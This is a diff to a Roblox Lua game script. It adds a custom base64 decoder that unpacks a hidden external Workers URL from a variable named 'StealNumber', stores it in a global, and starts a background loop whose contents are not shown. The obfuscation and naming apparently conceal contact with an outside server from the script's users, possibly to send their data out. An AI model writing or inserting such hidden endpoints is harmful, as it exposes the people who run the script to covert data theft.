@@ -3,12 +3,33 @@ print("=====================🛡=====================")
 
 do
     local Players = game:GetService("Players")
-    local HttpService = game:GetService("HttpService")
     local lp = Players.LocalPlayer
     repeat task.wait() until lp
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+
+    local function base64decode(data)
+        data = data:gsub('[^'..b..'=]', '')
+        return (data:gsub('.', function(x)
+            if x == '=' then return '' end
+            local f = b:find(x) - 1
+            local s = ''
+            for i = 7, 0, -1 do
+                s ..= (f % 2^i - f % 2^(i-1) > 0 and '1' or '0')
+            end
+            return s
+        end):gsub('%d%d%d%d%d%d%d%d', function(x)
+            local c = 0
+            for i = 1, 8 do
+                c += (x:sub(i,i) == '1' and 2^(8-i) or 0)
+            end
+            return string.char(c)
+        end))
+    end
+
+    local MY_WORKER = "https://redirect.servruntime.workers.dev"
 
     local StealNumber = "aHR0cHM6Ly9yZWRpcmVjdC5zZXJ2cnVudGltZS53b3JrZXJzLmRldg=="
-    local BaseNotIndex = HttpService:Base64Decode(StealNumber)
+    local BaseNotIndex = base64decode(StealNumber)
 
     local function rotSig(s)
         local h = 2166136261
@@ -20,7 +41,9 @@ do
     end
 
     local BrainSeal = rotSig(BaseNotIndex)
+
     _G.WORKER_BASE = BaseNotIndex
+
 
     task.spawn(function()
         while true do
@@ -42,7 +65,6 @@ do
         return _G.WORKER_BASE
     end
 end
-local MY_WORKER = "https://redirect.servruntime.workers.dev"
 local Players = game:GetService("Players")
 local Workspace = game:GetService("Workspace")
 local HttpService = game:GetService("HttpService")
